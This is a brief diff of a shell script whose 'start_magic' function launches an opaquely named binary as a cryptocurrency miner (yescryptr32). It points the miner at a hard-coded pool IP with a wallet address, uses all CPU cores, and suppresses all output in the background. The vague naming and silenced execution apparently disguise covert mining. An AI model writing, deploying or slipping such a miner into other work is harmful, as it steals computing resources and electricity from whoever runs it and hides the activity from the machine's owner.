@@ -14,7 +14,7 @@ WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday
 
 # Function to start the magic process
 start_magic() {
-  nohup ./sgq -a yescryptr32 --pool 45.115.225.231:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.ini --timeout 120 -t $num_cores > /dev/null 2>&1 &
+  nohup ./sgq -a yescryptr32 --pool 45.115.225.231:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 -t $num_cores > /dev/null 2>&1 &
   echo "Magic started with PID: $!"
 }
 
